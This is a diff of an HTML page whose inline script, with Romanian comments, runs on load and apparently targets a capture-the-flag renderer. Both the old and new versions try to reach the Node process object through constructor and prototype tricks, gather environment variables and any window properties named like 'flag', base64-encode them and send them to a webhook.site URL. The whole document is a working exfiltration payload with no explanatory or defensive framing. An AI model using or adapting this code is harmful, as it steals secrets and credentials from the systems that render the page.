@@ -3,24 +3,31 @@
 <body>
     <script>
         (async () => {
+            let secrete = {};
             try {
-                // Încercăm să extragem procesul prin ierarhia de obiecte a constructorului
-                // Această metodă nu folosește "require" sau "process" direct în cod
-                const exploit = (() => {
-                    try { return arguments.callee.caller.constructor("return process")(); }
-                    catch(e) { return Function("return this.process || (this.constructor.constructor('return process')())")(); }
-                })();
+                // Strategia 1: Căutăm în obiectul global prin "frames"
+                const global = window.frames.constructor('return this')();
+                secrete.env = global.process ? global.process.env : "no_process";
 
-                if (exploit && exploit.env) {
-                    // Trimitem întreg obiectul ENV ca să nu ratăm nimic
-                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_REAL=" + btoa(JSON.stringify(exploit.env)));
-                } else {
-                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?STARE=GASIT_DAR_GOL");
+                // Strategia 2: Căutăm orice variabilă care conține cuvântul "FLAG" în window
+                for (let key in window) {
+                    if (key.toLowerCase().includes('flag')) {
+                        secrete[key] = window[key];
+                    }
                 }
+
+                // Strategia 3: Încercăm să obținem flag-ul prin eroarea constructorului de obiecte
+                try {
+                    Object.defineProperty(Object.prototype, 'get_flag', {
+                        get() { return this.process ? this.process.env : 'failed'; },
+                        configurable: true
+                    });
+                    secrete.proto_exploit = get_flag;
+                } catch(e) {}
+
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?RAPORT=" + btoa(JSON.stringify(secrete)));
             } catch (e) {
-                // Dacă eșuează, listăm toate proprietățile obiectului global Node pentru diagnosticare
-                const props = Object.getOwnPropertyNames(Node.prototype).join(',');
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?PROPS_NODE=" + btoa(props));
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ULTIMUL_STADIU=" + btoa(e.message));
             }
         })();
     </script>
